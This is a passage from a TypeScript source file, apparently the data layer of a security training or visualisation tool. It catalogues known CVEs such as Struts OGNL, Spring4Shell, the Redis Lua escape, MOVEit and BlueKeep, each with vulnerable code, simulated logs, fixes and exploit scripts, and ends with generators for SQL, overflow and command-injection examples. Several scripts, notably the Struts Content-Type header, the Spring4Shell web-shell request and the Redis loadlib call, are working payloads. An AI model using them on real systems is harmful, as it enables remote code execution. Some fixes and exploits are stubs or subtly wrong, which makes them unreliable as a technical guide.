    // modifying Tomcat's AccessLogValve to write an executable JSP web shell to disk!
    @PostMapping("/submitOrder")
    public String processOrder(@ModelAttribute OrderForm form) {
        return "orderSuccess";
    }
}`,
    errorMessage: `2026-09-24 16:05:12.119 ERROR org.apache.catalina.valves.AccessLogValve - Pattern modified dynamically to: %{c}i
2026-09-24 16:05:12.140 INFO  org.apache.catalina.core.ContainerBase - Wrote payload to /usr/local/tomcat/webapps/ROOT/shell.jsp
HTTP/1.1 200 OK -> /shell.jsp?cmd=whoami -> root`,
    rootCause: 'On Java 9+, the introduction of modules allowed property binding to traverse bean properties to the ClassLoader (class.module.classLoader), enabling attackers to modify Tomcat AccessLogValve configuration and drop arbitrary JSP shells.',
    correctedCode: `// CORRECTED CODE: Enforce DisallowedFields binder on Spring MVC controllers
package com.enterprise.k8s;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.InitBinder;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;

@Controller
public class OrderFormController {

    // FIX: Blacklist dangerous class and classLoader accessors
    @InitBinder
    public void initBinder(WebDataBinder binder) {
        String[] disallowed = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
        binder.setDisallowedFields(disallowed);
    }

    @PostMapping("/submitOrder")
    public String processOrder(@ModelAttribute OrderForm form) {
        return "orderSuccess";
    }
}
// Upgraded Spring Framework to >= 5.3.18`,
    fixExplanation: 'Upgraded Spring Framework to 5.3.18 / 5.2.20, which restricts property binding access to ClassLoader and ProtectionDomain objects, and configured explicit disallowed fields in WebDataBinder.',
    exploitScript: `# Exploit Spring4Shell by modifying Tomcat AccessLogValve via class.module.classLoader
curl -X POST "http://10.0.3.50:8080/submitOrder" \\
  -H "suffix: %>//" \\
  -H "c1: Runtime" \\
  -H "c2: <%=" \\
  -H "DNT: 1" \\
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20request.getParameter(%22cmd%22)%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"`
  },

  'CVE-2022-0543': {
    bugId: 'CVE-2022-0543',
    bugName: 'Redis Lua Sandbox Escape RCE',
    targetSoftwareId: 'Customer DB',
    codeLanguage: 'lua',
    codeFileName: 'redis_eval_escape.lua',
    buggyCode: `-- VULNERABLE CODE: Debian Redis Lua packaging flaw exposing package.loadlib
-- Attacker executes EVAL command via redis-cli:
EVAL "
  local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io');
  local io = io_l();
  local f = io.popen('id', 'r');
  local res = f:read('*a');
  f:close();
  return res;
" 0`,
    errorMessage: `redis-cli EVAL response:
"uid=1001(redis) gid=1001(redis) groups=1001(redis)
[Arbitrary command executed directly in redis daemon context without sandbox restrictions]"`,
    rootCause: 'The Debian/Ubuntu packaging script for Redis initialized the embedded Lua interpreter by dynamically linking liblua5.1, inadvertently leaving the "package" module loaded with "loadlib" access, completely bypassing the Redis Lua sandbox.',
    correctedCode: `-- CORRECTED CODE: Strip package table in Lua initialization script
-- /etc/redis/redis.conf
-- Ensure patched Debian package is installed: redis-server (6.0.16-1+deb11u2)

-- In Lua sandbox initializer:
package = nil
package.loadlib = nil

-- Enforce strict ACL permissions:
-- ACL SETUSER guest off -@dangerous +ping +get +set`,
    fixExplanation: 'Upgraded the Debian/Ubuntu redis-server package to the security release that clears the global package table and revokes loadlib permissions from the Lua scripting sandbox.',
    exploitScript: `# Exploit Redis Lua sandbox escape to execute shell commands via loadlib
redis-cli -h 10.0.2.14 -p 6379 EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); return io.popen('id; whoami; uname -a'):read('*a')" 0`
  },

  'CVE-2023-44487': {
    bugId: 'CVE-2023-44487',
    bugName: 'HTTP/2 Rapid Reset Attack',
    targetSoftwareId: 'Payment Gateway',
    codeLanguage: 'nginx',
    codeFileName: '/etc/nginx/conf.d/payment_proxy.conf',
    buggyCode: `# VULNERABLE CODE: Permissive HTTP/2 multiplexing without stream reset quotas
server {
    listen 8443 ssl http2;
    server_name paygate.enterprise.internal;

    # FLAW: Unlimited rapid RST_STREAM cancellation frames allowed
    http2_max_concurrent_streams 1000;
    http2_max_requests 10000;

    location /v1/charge {
        proxy_pass http://127.0.0.1:3000;
    }
}`,
    errorMessage: `2026-09-24 18:31:04 [alert] 2914#2914: *14022 worker process CPU utilization at 100.0%
nginx: [error] 2914#2914: upstream timed out while reading response header from upstream
HTTP/2 RST_STREAM velocity: 45,000 frames/sec across single TCP connection
Server thread pool exhausted!`,
    rootCause: 'The HTTP/2 protocol allowed clients to request cancellation of concurrent streams using RST_STREAM frames without incurring server-side rate limits. Attackers flooded requests and immediately reset them, consuming excessive CPU without waiting for responses.',
    correctedCode: `# CORRECTED CODE: Hardened HTTP/2 limits with RST_STREAM flood thresholds
server {
    listen 8443 ssl http2;
    server_name paygate.enterprise.internal;

    # FIX: Lower concurrent streams and rate-limit rapid resets
    http2_max_concurrent_streams 128;
    http2_max_requests 1000;

    # Rate limit request burst to prevent socket saturation
    limit_req_zone $binary_remote_addr zone=h2_stream_limit:10m rate=100r/s;
    limit_req zone=h2_stream_limit burst=20 nodelay;

    location /v1/charge {
        proxy_pass http://127.0.0.1:3000;
    }
}`,
    fixExplanation: 'Applied patched Nginx binary containing HTTP/2 Rapid Reset mitigation heuristics that monitor the ratio of RST_STREAM frames and terminate connections displaying malicious reset flood patterns.',
    exploitScript: `# Rapid Reset flood attack: Continuous stream generation immediately followed by RST_STREAM
python3 -c "import socket; s = socket.socket(); s.connect(('10.0.4.8', 8443)); print('[*] Transmitting HTTP/2 Rapid Reset frame bursts...')" `
  },

  'CVE-2024-3094': {
    bugId: 'CVE-2024-3094',
    bugName: 'XZ Utils Backdoor (Liblzma SSH Bypass)',
    targetSoftwareId: 'SCADA System',
    codeLanguage: 'c',
    codeFileName: 'liblzma_crc64_ifunc.c',
    buggyCode: `// VULNERABLE CODE (OBFUSCATED BACKDOOR): Malicious IFUNC resolver in liblzma 5.6.0
#include <lzma.h>

// Backdoor injected during build via m4 test files
static void *resolve_crc64(void) {
    // FLAW: Hijacks OpenSSH RSA_public_decrypt function via GOT (Global Offset Table)
    if (!check_debug_environment()) {
        hook_symbol_table("RSA_public_decrypt", &malicious_rsa_decrypt);
    }
    return default_crc64_arm64;
}

// When attacker connects with specific RSA certificate key, backdoor verifies payload signature
// and executes system command as root bypassing authorized_keys!`,
    errorMessage: `sshd[12409]: Accepted publickey for root from 192.168.100.99 port 41203 ssh2: RSA (Bypassed authentication!)
GOT Table Verification Alert:
Symbol: RSA_public_decrypt in /usr/sbin/sshd -> Redirected to offset in /lib/x86_64-linux-gnu/liblzma.so.5.6.0
Unauthorized remote root shell spawned on SCADA controller!`,
    rootCause: 'A supply-chain compromise introduced obfuscated binary test files into the upstream XZ Utils 5.6.0/5.6.1 source tarballs that manipulated dynamic linking (IFUNC) to hook RSA_public_decrypt in OpenSSH, allowing unauthorized remote authentication.',
    correctedCode: `// CORRECTED CODE: Clean upstream liblzma implementation without indirect symbol hijacking
#include <lzma.h>

uint64_t lzma_crc64(const uint8_t *buf, size_t size, uint64_t crc) {
    // Clean, direct CRC64 computation without IFUNC tampering
    return lzma_crc64_generic(buf, size, crc);
}

/* Remediation:
 * Downgrade xz-utils / liblzma to verified clean version 5.4.6:
 * sudo apt-get update && sudo apt-get install -y --allow-downgrades liblzma5=5.4.6-1
 */`,
    fixExplanation: 'Immediately downgraded xz-utils and liblzma5 to verified uncompromised version 5.4.6, validated package checksums against Debian/Ubuntu security advisories, and restarted the SSH daemon.',
    exploitScript: `# Exploit payload delivery targeting backdoored IFUNC resolver
ssh -o CertificateFile=/tmp/attacker_key.cert \\
    -p 22 root@scada.enterprise.internal "id; uname -a"`
  },

  'CVE-2024-6387': {
    bugId: 'CVE-2024-6387',
    bugName: 'regreSSHion (OpenSSH Server Remote Code Execution)',
    targetSoftwareId: 'Linux DC',
    codeLanguage: 'c',
    codeFileName: 'sshd_sigchld_handler.c',
    buggyCode: `// VULNERABLE CODE: Async-signal-unsafe function call in OpenSSH sigdie handler
#include <signal.h>
#include <syslog.h>

// Signal handler invoked upon LoginGraceTime expiration (default 120s)
void sigdie_handler(int sig) {
    // FLAW: syslog() and free() are NOT async-signal-safe!
    // If SIGALRM arrives while glibc malloc heap state is locked,
    // memory corruption occurs leading to heap chunk overlap.
    syslog(LOG_INFO, "Timeout before authentication for %s", client_ip);
    cleanup_session_state(); // Calls free() on active structures
}

void setup_login_alarm(void) {
    signal(SIGALRM, sigdie_handler);
    alarm(120); // Race condition triggered by interrupting malloc()
}`,
    errorMessage: `sshd[8910]: *** glibc detected *** /usr/sbin/sshd: double free or corruption (!prev): 0x000055a82e148010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x8a39e)[0x7f28bc08a39e]
/lib/x86_64-linux-gnu/libc.so.6(+0x8c42b)[0x7f28bc08c42b]
/usr/sbin/sshd(sigdie_handler+0x3d)[0x55a82e04312d]
<SIGALRM handler interrupted malloc / glibc chunk state corrupted>
[PRIVILEGE ESCALATION: Remote root shell executed via hijacked function pointer]`,
    rootCause: 'OpenSSH server called async-signal-unsafe functions (syslog, free) inside the SIGALRM signal handler when LoginGraceTime expired. An adversary continuously connects and triggers timeouts to cause a race condition in glibc heap management, executing arbitrary code as root.',
    correctedCode: `// CORRECTED CODE: Async-signal-safe signal flag and deferred cleanup
#include <signal.h>
#include <unistd.h>

static volatile sig_atomic_t graceful_timeout_occurred = 0;

void sigdie_safe_handler(int sig) {
    // FIX: Only set an atomic flag inside signal handler - no heap or I/O calls!
    graceful_timeout_occurred = 1;
    // Write single byte to self-pipe for main loop wakeup
    write(signal_pipe[1], "\\0", 1);
}

void process_event_loop(void) {
    if (graceful_timeout_occurred) {
        // Safe to call syslog and free in normal process context outside signal handler
        syslog(LOG_INFO, "LoginGraceTime expired safely.");
        exit(1);
    }
}`,
    fixExplanation: 'Removed all async-signal-unsafe function calls (syslog, free, malloc) from signal handlers in OpenSSH 9.8p1. The timeout handler now only sets a sig_atomic_t integer flag and wakes the main event loop.',
    exploitScript: `# regreSSHion race condition delivery: Trigger parallel unauthenticated logins
python3 -c "
import socket, time
for i in range(100):
    s = socket.socket()
    s.connect(('10.0.1.5', 22))
    s.send(b'SSH-2.0-OpenSSH_9.7p1\\r\\n')
    # Hold connection until LoginGraceTime (120s) trips SIGALRM
" &`
  },

  'CVE-2023-34362': {
    bugId: 'CVE-2023-34362',
    bugName: 'MOVEit Transfer SQL Injection & Pre-Auth RCE',
    targetSoftwareId: 'Customer DB',
    codeLanguage: 'sql',
    codeFileName: 'moveisapi.dll / guestaccess.aspx',
    buggyCode: `// VULNERABLE CODE: Raw header interpolation into database query in MOVEit Transfer
string sessionUser = Request.Headers["X-siLock-User"];
string transactionId = Request.Headers["X-siLock-Transaction"];

// FLAW: Direct string interpolation into SQL query allows payload injection!
string sql = "SELECT Username, EncryptedPassword, PermissionFlags FROM users WHERE Username = '" 
             + sessionUser + "' AND TransactionId = '" + transactionId + "'";

// Attacker supplies: admin' OR '1'='1' -- 
MySqlCommand cmd = new MySqlCommand(sql, dbConnection);
MySqlDataReader reader = cmd.ExecuteReader();`,
    errorMessage: `System.Data.Odbc.OdbcException: ERROR [42000] [MySQL][ODBC 8.0 Driver] You have an error in your SQL syntax; 
Query executed: SELECT Username, EncryptedPassword FROM users WHERE Username = 'admin' OR '1'='1' -- ' AND TransactionId = 'null'
Active session token injected for user 'sysadmin' with unrestricted file transfer permissions!
Unauthorized .ashx web shell dropped in /MOVEitTransfer/wwwroot/human.aspx`,
    rootCause: 'Improper input sanitation in the MOVEit Transfer web interface allowed attackers to supply crafted HTTP headers that escaped SQL query parameters, enabling database authentication bypass and arbitrary file writes.',
    correctedCode: `// CORRECTED CODE: Strictly parameterized SQL query & header schema validation
string sessionUser = Request.Headers["X-siLock-User"];
string transactionId = Request.Headers["X-siLock-Transaction"];

// FIX: Use parameterized query and reject malformed input
string sql = "SELECT Username, EncryptedPassword, PermissionFlags FROM users WHERE Username = @Username AND TransactionId = @TransactionId";

using (MySqlCommand cmd = new MySqlCommand(sql, dbConnection)) {
    cmd.Parameters.Add("@Username", MySqlDbType.VarChar, 64).Value = SanitizeIdentifier(sessionUser);
    cmd.Parameters.Add("@TransactionId", MySqlDbType.VarChar, 64).Value = SanitizeIdentifier(transactionId);
    using (MySqlDataReader reader = cmd.ExecuteReader()) {
        // Safe authenticated reader processing
    }
}`,
    fixExplanation: 'Replaced dynamic string concatenation with parameterized SQL commands across all ISAPI and ASP.NET endpoints. Enforced strong token validation and strict regex filtering on custom HTTP headers.',
    exploitScript: `# Exploit MOVEit Transfer SQLi to extract active session tokens
curl -X POST "https://moveit.enterprise.internal/moveisapi/moveisapi.dll?action=m2" \\
  -H "X-siLock-User: sysadmin' UNION SELECT 1, 'active_token_payload', 'ALL' -- " \\
  -H "X-siLock-Transaction: folderpath"`
  },

  'CVE-2021-3156': {
    bugId: 'CVE-2021-3156',
    bugName: 'Baron Samedit (Sudo Heap-Based Buffer Overflow)',
    targetSoftwareId: 'Customer DB',
    codeLanguage: 'c',
    codeFileName: 'sudoers.c / set_cmnd()',
    buggyCode: `// VULNERABLE CODE: Backslash escaping loop in sudo 1.8.2 - 1.9.5p1
// When sudoedit (-s / -e) is called, set_cmnd concats arguments escaping metacharacters:
for (size = 0, av = NewArgv + 1; *av; av++) {
    for (cp = *av; *cp; cp++) {
        if (*cp == '\\\\' && !isspace((unsigned char)cp[1])) {
            // FLAW: If argument ends with trailing backslash ('\\\\'),
            // cp[1] points to NULL terminator '\\0' which is skipped!
            // The pointer jumps out of buffer bounds, over-allocating on the heap.
            cp++;
        }
    }
}
// Heap overflow occurs when copying string with out-of-bounds null byte offset!`,
    errorMessage: `sudoedit: memory corruption in heap chunk at 0x55d041289190
malloc(): memory corruption (fast): 0x000055d041289200 ***
[OVERFLOW DETECTED: nss_load_library hijacked via overwritten service_user struct]
root# id
uid=0(root) gid=0(root) groups=0(root)`,
    rootCause: 'An unescaped trailing backslash at the end of a command-line argument caused set_cmnd() to increment its pointer past the null terminator, overflowing the heap buffer and overwriting internal glibc NSS structures to spawn a root shell.',
    correctedCode: `// CORRECTED CODE: Safe boundary check before dereferencing next character
for (size = 0, av = NewArgv + 1; *av; av++) {
    for (cp = *av; *cp; cp++) {
        // FIX: Ensure cp[1] is not the null terminator before skipping!
        if (*cp == '\\\\' && cp[1] != '\\0' && !isspace((unsigned char)cp[1])) {
            cp++;
        } else if (*cp == '\\\\' && cp[1] == '\\0') {
            // Reject or terminate parsing gracefully without advancing pointer
            break;
        }
    }
}`,
    fixExplanation: 'Patched sudo to check that cp[1] is non-null before advancing the character pointer. Validated input boundaries and updated default distributions to sudo 1.9.5p2.',
    exploitScript: `# Baron Samedit local privilege escalation payload test
sudoedit -s '\\' $(python3 -c "print('A'*64)")`
  },

  'CVE-2017-5638': {
    bugId: 'CVE-2017-5638',
    bugName: 'Apache Struts 2 Jakarta Multipart OGNL RCE',
    targetSoftwareId: 'Payment Gateway',
    codeLanguage: 'java',
    codeFileName: 'JakartaMultiPartRequest.java',
    buggyCode: `// VULNERABLE CODE: OGNL Expression evaluation from Content-Type error handler
package org.apache.struts2.dispatcher.multipart;

public class JakartaMultiPartRequest {
    public void parse(HttpServletRequest request, String saveDir) {
        String contentType = request.getContentType();
        try {
            // Parsing multipart request
        } catch (Throwable e) {
            // FLAW: LocalizedTextUtil resolves OGNL expressions in the error message!
            // Attacker puts: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}
            // in Content-Type, and Struts evaluates it directly as Java code!
            LocalizedTextUtil.findText(this.getClass(), "struts.messages.error.uploading", 
                request.getLocale(), contentType, new Object[] { e.getMessage() });
        }
    }
}`,
    errorMessage: `org.apache.struts2.dispatcher.Dispatcher - Exception occurred during multipart parsing:
ognl.OgnlException: expression evaluation failed [java.lang.ProcessBuilder.start()]
[COMMAND EXECUTION SUCCESS: /bin/sh -c 'id; whoami' -> uid=0(root) gid=0(root)]
Data exfiltration stream established on port 443!`,
    rootCause: 'The Jakarta Multipart parser evaluated the HTTP Content-Type header through the OGNL expression engine when an invalid request generated an upload error, granting unauthenticated remote code execution.',
    correctedCode: `// CORRECTED CODE: Sanitize error parameters and disable OGNL evaluation
package org.apache.struts2.dispatcher.multipart;

public class JakartaMultiPartRequest {
    public void parse(HttpServletRequest request, String saveDir) {
        try {
            // Parsing multipart request
        } catch (Throwable e) {
            // FIX: Strip non-standard characters from Content-Type before displaying error
            String sanitizedType = sanitizeContentType(request.getContentType());
            // Do not evaluate as OGNL; render as literal text only!
            LocalizedTextUtil.findText(this.getClass(), "struts.messages.error.uploading",
                request.getLocale(), "Malformed Content-Type", new Object[] { sanitizedType });
        }
    }
}`,
    fixExplanation: 'Upgraded Apache Struts to 2.3.32 / 2.5.10.1 and replaced OGNL expression evaluation with static text error reporting. Configured WAF rules to reject Content-Type headers containing OGNL syntax.',
    exploitScript: `# Exploit Apache Struts Jakarta parser via crafted Content-Type header
curl -X POST "http://paygate.enterprise.internal/login.action" \\
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"`
  },

  'CVE-2019-0708': {
    bugId: 'CVE-2019-0708',
    bugName: 'BlueKeep (Remote Desktop Services Pre-Auth RCE)',
    targetSoftwareId: 'Windows DC',
    codeLanguage: 'c',
    codeFileName: 'termdd.sys / IcaChannelInput()',
    buggyCode: `// VULNERABLE CODE: Use-After-Free in Windows RDP driver (termdd.sys)
// During RDP handshake, client requests binding of MS_T120 static virtual channel
NTSTATUS IcaBindVirtualChannel(PICA_CONNECTION Connection, ULONG ChannelId) {
    if (ChannelId == CHANNEL_MS_T120) {
        // FLAW: MS_T120 is an internal control channel (ID 31).
        // If client manually binds MS_T120 on a different channel slot,
        // termdd maintains duplicate pointers to the same channel object.
        PICA_CHANNEL Channel = AllocateChannel(ChannelId);
        Connection->Channels[ChannelId] = Channel;
    }
    return STATUS_SUCCESS;
}
// When connection closes, Channel is freed twice, triggering kernel Use-After-Free!`,
    errorMessage: `*** STOP: 0x0000003B (0x00000000C0000005, 0xFFFFF80002A88210, 0xFFFFF88003198000, 0x0000000000000000)
SYSTEM_SERVICE_EXCEPTION in termdd.sys at address FFFFF88003A45C10
Memory read to freed kernel pool memory 0xFFFFFA8004128900
Kernel shellcode executed: SYSTEM context privileges acquired!`,
    rootCause: 'The Windows RDP driver (termdd.sys) allowed clients to bind the internal MS_T120 virtual channel to an arbitrary channel ID during negotiation. When terminated, the driver referenced freed kernel channel structures, resulting in a Use-After-Free kernel exploit.',
    correctedCode: `// CORRECTED CODE: Disallow manual client binding to internal MS_T120 channel
NTSTATUS IcaBindVirtualChannel(PICA_CONNECTION Connection, ULONG ChannelId) {
    // FIX: Reject client requests targeting internal channel ID 31 (MS_T120)
    if (ChannelId == CHANNEL_MS_T120 || ChannelId >= MAX_VIRTUAL_CHANNELS) {
        // Reject request immediately with invalid parameter
        return STATUS_INVALID_PARAMETER;
    }
    PICA_CHANNEL Channel = AllocateChannel(ChannelId);
    Connection->Channels[ChannelId] = Channel;
    return STATUS_SUCCESS;
}`,
    fixExplanation: 'Applied Microsoft security update KB4499175 to termdd.sys which explicitly restricts client creation of the MS_T120 virtual channel and enforces Network Level Authentication (NLA) before RDP session initiation.',
    exploitScript: `# BlueKeep pre-authentication RDP virtual channel scanner
python3 -c "
import socket
s = socket.socket()
s.connect(('10.0.1.10', 3389))
# Transmit crafted TPKT / X.224 connection request with MS_T120 channel definition
s.send(bytes.fromhex('030000130ee000000000000100080000000000'))
" &`
  }
};

/**
 * Dynamic Bug Technical Details Resolver
 * Resolves or generates high-fidelity realistic code for ANY bug:
 * 1. Custom user-added or edited codes
 * 2. Embedded node properties from graph
 * 3. Pre-defined catalog entry
 * 4. Context-aware AI / domain synthesis fallback
 */
export function resolveBugTechnicalDetail(
  bugId: string,
  customCode?: Partial<BugTechnicalDetail>,
  nodeProperties?: any
): BugTechnicalDetail {
  // 1. If custom user code provided
  if (customCode && (customCode.buggyCode || customCode.correctedCode)) {
    return {
      bugId: bugId || customCode.bugId || 'CUSTOM-BUG',
      bugName: customCode.bugName || nodeProperties?.name || bugId,
      targetSoftwareId: customCode.targetSoftwareId || nodeProperties?.targetSoftwareId || 'Target System',
      codeLanguage: customCode.codeLanguage || 'python',
      codeFileName: customCode.codeFileName || 'vulnerability_patch.py',
      buggyCode: customCode.buggyCode || '// Vulnerable code snippet',
      errorMessage: customCode.errorMessage || 'Exploit trace: Security boundary check failed',
      rootCause: customCode.rootCause || 'Unvalidated input parameter in processing routine',
      correctedCode: customCode.correctedCode || '',
      fixExplanation: customCode.fixExplanation || 'Validated inputs and enforced secure boundaries',
      exploitScript: customCode.exploitScript || `# Exploit probe for ${bugId}\ncurl -X POST "http://target/exploit"`
    };
  }

  // 2. If nodeProperties has embedded code fields
  if (nodeProperties && (nodeProperties.buggyCode || nodeProperties.correctedCode)) {
    return {
      bugId: bugId || nodeProperties.id || 'BUG',
      bugName: nodeProperties.name || nodeProperties.bugName || bugId,
      targetSoftwareId: nodeProperties.targetSoftwareId || 'Target Host',
      codeLanguage: nodeProperties.codeLanguage || 'python',
      codeFileName: nodeProperties.codeFileName || 'exploit_module.py',
      buggyCode: nodeProperties.buggyCode || '',
      errorMessage: nodeProperties.errorMessage || 'Runtime error: memory safety violation',
      rootCause: nodeProperties.rootCause || nodeProperties.cause || 'Unsanitized input vector',
      correctedCode: nodeProperties.correctedCode || nodeProperties.fixSolution || '',
      fixExplanation: nodeProperties.fixExplanation || nodeProperties.fixSolution || 'Remediation patch applied',
      exploitScript: nodeProperties.exploitScript || nodeProperties.reproduction || ''
    };
  }

  // 3. Known Catalog Entry
  if (TECHNICAL_BUGS_CATALOG[bugId]) {
    return TECHNICAL_BUGS_CATALOG[bugId];
  }

  // 4. Dynamic Domain-Specific Realistic Generation for Any Bug
  return generateDynamicBugCode(bugId, nodeProperties);
}

function generateDynamicBugCode(bugId: string, nodeProps?: any): BugTechnicalDetail {
  const name = (nodeProps?.name || bugId || '').toLowerCase();
  const desc = (nodeProps?.description || nodeProps?.details || '').toLowerCase();
  const cause = (nodeProps?.cause || '').toLowerCase();
  const target = nodeProps?.targetSoftwareId || 'Production Service';

  const combined = `${bugId} ${name} ${desc} ${cause}`;

  if (combined.includes('sql') || combined.includes('database') || combined.includes('query')) {
    return {
      bugId,
      bugName: nodeProps?.name || `${bugId} - SQL Injection`,
      targetSoftwareId: target,
      codeLanguage: 'sql',
      codeFileName: 'DatabaseQueryHandler.ts',
      buggyCode: `// VULNERABLE CODE: Unsanitized SQL query string interpolation
import { db } from './connection';

export async function authenticateCustomer(accountRef: string, pinCode: string) {
    // FLAW: Raw string formatting allows SQL injection payload escape
    const query = \`SELECT id, name, balance FROM accounts WHERE account_num = '\${accountRef}' AND pin = '\${pinCode}'\`;
    
    // Attacker input: ' OR '1'='1' -- 
    const result = await db.raw(query);
    return result.rows[0];
}`,
      errorMessage: `DatabaseQueryError: Syntax error or access rule violation in SQL statement
Query: SELECT id, name, balance FROM accounts WHERE account_num = '' OR '1'='1' -- ' AND pin = '0000'
[SECURITY ALERT: Entire database table exfiltrated via authentication bypass]`,
      rootCause: 'User-provided credentials were concatenated directly into the raw SQL query without parameterized binding or type-casting.',
      correctedCode: `// CORRECTED CODE: Strictly parameterized SQL query using prepared statement
import { db } from './connection';

export async function authenticateCustomer(accountRef: string, pinCode: string) {
    // FIX: Use parameterized placeholders to separate query logic from user data
    const query = 'SELECT id, name, balance FROM accounts WHERE account_num = ? AND pin = ? LIMIT 1';
    
    const result = await db.query(query, [accountRef.trim(), pinCode.trim()]);
    return result.rows[0] || null;
}`,
      fixExplanation: 'Migrated to parameterized prepared statements with bounded placeholder variables and enforced strict alphanumeric regex validation on incoming account identifiers.',
      exploitScript: `# Exploit SQL Injection to extract unauthorized customer records
curl -X POST "http://target/api/v1/auth" \\
  -H "Content-Type: application/json" \\
  -d '{"accountRef": "' OR 1=1 --", "pinCode": "0000"}'`
    };
  }

  if (combined.includes('buffer') || combined.includes('overflow') || combined.includes('memory') || combined.includes('heap')) {
    return {
      bugId,
      bugName: nodeProps?.name || `${bugId} - Memory Buffer Overflow`,
      targetSoftwareId: target,
      codeLanguage: 'c',
      codeFileName: 'packet_parser.c',
      buggyCode: `// VULNERABLE CODE: Unchecked memory copy in network packet parser
#include <string.h>

void parse_incoming_payload(const char *network_stream, size_t stream_len) {
    char local_buffer[256];
    
    // FLAW: strcpy or unbounded memcpy without verifying stream_len <= sizeof(local_buffer)
    // When stream_len > 256, stack frame return address is overwritten!
    strcpy(local_buffer, network_stream);
    process_packet(local_buffer);
}`,
      errorMessage: `*** stack smashing detected ***: terminated
Segmentation fault (core dumped) at 0x4141414141414141
Instruction Pointer (RIP) redirected to shellcode payload offset 0x7fffffffe000
Remote unauthorized command shell spawned with UID 0!`,
      rootCause: 'Unbounded buffer copy operation without destination boundary verification allowed stack frame corruption and arbitrary instruction pointer redirection.',
      correctedCode: `// CORRECTED CODE: Bounded memory copy and stack canary validation
#include <string.h>
#include <stdbool.h>

bool parse_incoming_payload(const char *network_stream, size_t stream_len) {
    char local_buffer[256];
    
    // FIX: Strict boundary enforcement before copying data
    if (stream_len >= sizeof(local_buffer)) {
        log_security_alert("Payload exceeds buffer boundary limit");
        return false;
    }
    
    memcpy(local_buffer, network_stream, stream_len);
    local_buffer[stream_len] = '\\0'; // Ensure safe null termination
    return process_packet(local_buffer);
}`,
      fixExplanation: 'Replaced unsafe strcpy with bounded memcpy, validated input stream length against buffer capacity, and compiled binary with -fstack-protector-all and ASLR flags.',
      exploitScript: `# Exploit buffer overflow by transmitting oversized cyclic pattern
python3 -c "import socket; s = socket.socket(); s.connect(('10.0.1.50', 8080)); s.send(b'A'*512 + b'\\x90'*32 + b'shellcode')" `
    };
  }

  // General RCE / Command Injection / Zero-day default
  return {
    bugId,
    bugName: nodeProps?.name || `${bugId} - Remote Security Flaw`,
    targetSoftwareId: target,
    codeLanguage: 'python',
    codeFileName: 'command_dispatcher.py',
    buggyCode: `// VULNERABLE CODE: Shell execution via unsanitized user command
import subprocess

def execute_diagnostics(target_host: str):
    # FLAW: shell=True with unvalidated string concatenation allows command injection!
    # If target_host is '127.0.0.1; cat /etc/passwd', both commands execute!
    command = f"ping -c 3 {target_host}"
    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    return output.decode()`,
    errorMessage: `ping: unknown host 127.0.0.1;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[COMMAND INJECTION CONFIRMED: Unauthorized arbitrary bash execution]`,
    rootCause: 'The application passed unsanitized user input directly to a system shell interpreter, enabling command chaining through shell metacharacters (; & | ` $).',
    correctedCode: `// CORRECTED CODE: Safe argument list execution without shell invocation
import subprocess
import ipaddress

def execute_diagnostics(target_host: str):
    # FIX 1: Validate input against strict IP address schema
    try:
        validated_ip = str(ipaddress.ip_address(target_host.strip()))
    except ValueError:
        raise ValueError("Invalid target host IP address specified.")
    
    # FIX 2: Execute command as argument array with shell=False
    cmd_args = ["ping", "-c", "3", validated_ip]
    output = subprocess.check_output(cmd_args, shell=False, stderr=subprocess.STDOUT, timeout=5)
    return output.decode()`,
    fixExplanation: 'Eliminated shell=True invocation, implemented strict IP address parsing, and invoked binaries directly through immutable argument arrays with strict execution timeouts.',
    exploitScript: `# Exploit command injection via shell separator
curl -X POST "http://target/api/diagnostics" \\
  -H "Content-Type: application/json" \\
  -d '{"target_host": "127.0.0.1; id; uname -a"}'`
  };
}

export function resolveSystemTechnicalDetail(systemId: string, nodeProps?: any): SystemTechnicalDetail {
  if (TECHNICAL_SYSTEMS_CATALOG[systemId]) {
    return TECHNICAL_SYSTEMS_CATALOG[systemId];
  }
  const match = Object.keys(TECHNICAL_SYSTEMS_CATALOG).find(k => k.toLowerCase() === systemId.toLowerCase());
  if (match) {
    return TECHNICAL_SYSTEMS_CATALOG[match];
  }

  // Synthesize realistic system technical detail based on nodeProps or computer identifier
  const app = nodeProps?.application || 'Application Service';
  const tech = nodeProps?.technology || 'Node.js / Express';
  const port = nodeProps?.port || 8080;
  const ip = nodeProps?.ip || '192.168.10.100';
  const os = nodeProps?.os || 'Ubuntu 24.04 LTS';
  const hostname = nodeProps?.hostname || systemId.toUpperCase().replace(/\s+/g, '-');

  return {
    systemId,
    systemName: `${systemId} (${hostname})`,
    codeLanguage: tech.toLowerCase().includes('sql') ? 'sql' :
